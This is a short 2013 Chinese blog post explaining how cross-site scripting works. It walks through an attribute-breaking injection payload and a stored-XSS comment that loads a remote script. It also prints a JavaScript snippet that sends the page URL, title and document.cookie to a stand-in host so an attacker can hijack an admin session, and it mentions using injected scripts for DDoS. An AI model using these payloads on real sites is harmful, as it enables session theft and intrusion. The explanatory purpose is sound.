---
author: levin
comments: true
date: 2013-08-29 22:10:09+08:00
layout: post
title: "跨站脚本攻击实现原理"
categories:
- web
tags:
- javascript
---



跨站脚本攻击`Cross-site scripting`是个比较老的漏洞攻击方法，今天对其了解了下。

它是如何实现的呢，假设有个表单需要提交，其中某个字段形如<!-- more -->

        <input type="text" name="t" value="" />

攻击者在此输入框填写了

        " /><script>alert('xss')</script><input value="

这样的内容提交到服务器，而服务器没有进行过滤处理，将其存入数据库，下次编辑此表单时服务器对此内容输出，raw的html看起来像这样：

        <input type="text" name="t" value="" /><script>alert('xss')</script><input value="" />

然后页面上就会多出1个输入框，并且会弹出确认框。这就是最简单的跨站脚本植入。

假设有个提交评论的输入框，在其上提交评论：

        <script src="http://example.com/xss.js"></script>

提交表单，如果这段代码没有被过滤，当后台管理员查看评论时，照常运行的话，此段代码将开始工作，首先会请求`http://example.com/xss.js`，如果此时`http://example.com/xss.js`返回的内容为：

{% highlight javascript %}
    (function(){
        (new Image()).src = 'http://exmaple.com/xss_recv?location=' + encodeURIComponent(window.location.href) + '&cookie=' + document.cookie + '&title=' + encodeURIComponent(document.title)
    })()
{% endhighlight %}

那么浏览器将请求`http://exmaple.com/xss_recv`这个链接并附带上被脚本植入页面的一些信息，攻击者获取到这些信息，会尝试登陆那个管理后台，伪造cookie进行访问。

当然，除了窃取信息，也可以在访问量大的页面植入脚本，让脚本指向某个小型网站，可以达到DDoS的效果，使小网站宕机。

